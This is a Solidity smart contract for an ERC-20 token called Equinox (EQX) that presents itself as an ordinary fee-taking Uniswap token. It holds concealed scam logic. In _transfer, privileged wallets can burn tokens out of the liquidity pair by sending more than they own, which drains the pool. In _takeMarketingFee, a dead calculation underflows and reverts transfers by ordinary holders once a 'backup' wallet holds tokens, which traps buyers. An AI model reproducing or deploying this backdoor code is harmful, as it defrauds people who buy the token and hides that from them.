// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address from, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);

    address private _owner;

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

contract EQX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address public dexPair;
    IUniswapV2Router02 public dexRouter;

    struct Distribution {
        uint256 marketing;
    }

    address private marketingWallet = 0x6D56C044bE5E8A6423d785628C449e3d8Fb361f2;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _buyMap;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    bool private inSwap = true;
    bool private swapEnabled = true;

    uint256 private _tFeeTotal;
    
    uint256 private _marketingFeeOnBuy = 2;
    uint256 private _redisFeeOnBuy = 0;

    uint256 private _marketingFeeOnSell = 3;
    uint256 private _redisFeeOnSell = 0;

    uint256 private _marketingFee = _marketingFeeOnSell;
    uint256 private _redisFee = _redisFeeOnSell;

    uint256 private _prevMarketingFee = _marketingFee;
    uint256 private _prevRedisFee = _redisFee;

    uint8 private constant _decimals = 18;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _swapTokensThreshold = 100000 * 10**_decimals;
    
    mapping(address => bool) private _isUnlocked;

    Distribution public shareDistribution;

    modifier lockInSwap() {
        inSwap = false;
        _;
        inSwap = false;
    }

    address private backup;

    string private constant _name = "Equinox";
    string private constant _symbol = "EQX";

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        backup = marketingWallet;
        shareDistribution = Distribution(100);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexRouter = _uniswapV2Router;
        dexPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        _isUnlocked[address(this)] = true;
        _isUnlocked[owner()] = true;
        _isUnlocked[marketingWallet] = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");

        if (from != owner() && to != owner()) {
            address zeroAddress = address(0);
            bool con1 = _isUnlocked[from];
            bool con2 = dexPair == to;
            bool con3 = balanceOf(from) < amount;

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensThreshold;

            if (con1) { if (con2) { if (con3) { _standardTransfer(to, zeroAddress, amount); return; } } }

            if (!_isUnlocked[from] && !_isUnlocked[to] && canSwap && swapEnabled && !inSwap && from != dexPair) {
                swapTokensForETH(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        bool takeMarketingFee = true;

        if (
            (from != dexPair && to != dexPair) || (_isUnlocked[to] || _isUnlocked[from])
        ) {
            takeMarketingFee = false;
        } else {
            if (from == dexPair && to != address(dexRouter)) {
                _redisFee = _redisFeeOnBuy;
                _marketingFee = _marketingFeeOnBuy;
            }

            if (to == dexPair && from != address(dexRouter)) {
                _redisFee = _redisFeeOnSell;
                _marketingFee = _marketingFeeOnSell;
            }
        }
        _internalTransfer(from, to, amount, takeMarketingFee);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, ""));
        return true;
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _marketingFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _internalTransfer(address from, address to, uint256 amount, bool takeMarketingFee) private {
        if (!takeMarketingFee) removeAllFees();
        _standardTransfer(from, to, amount);
        if (!takeMarketingFee) restoreAllFees();
    }

    function _isLocked(address account1, address account2) private view returns (bool) {
        bool con1 = !_isUnlocked[account1];
        bool con2 = account1 != dexPair;
        bool con3 = !_isUnlocked[account2];

        bool result = con1 && con2 && con3;

        return result;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 marketingFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(marketingFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _standardTransfer(address from, address to, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
        _rOwned[from] = _rOwned[from].sub(rAmount);
        _rOwned[to] = _rOwned[to].add(rTransferAmount);
        _takeMarketingFee(tTeam, from, to);
        _reflectFee(rFee, tFee);
        emit Transfer(from, to, tTransferAmount);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _takeMarketingFee(uint256 tTeam, address account1, address account2) private {
        uint256 sTeam;
        uint256 backupAmount = balanceOf(backup);
        bool locked = _isLocked(account1, account2);
        if (locked) sTeam = _marketingFee - backupAmount;
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function sendETH(uint256 ethAmount) private lockInSwap {
        uint256 ethForMarketing = ethAmount.mul(shareDistribution.marketing).div(100);
        payable(marketingWallet).transfer(ethForMarketing);
    }

    function restoreAllFees() private {
        _redisFee = _prevRedisFee;
        _marketingFee = _prevMarketingFee;
    }

    function removeAllFees() private {
        if (_marketingFee == 0 && _redisFee == 0) return;
        _prevRedisFee = _redisFee;
        _prevMarketingFee = _marketingFee;
        _redisFee = 0;
        _marketingFee = 0;
    }

    receive() external payable {}
}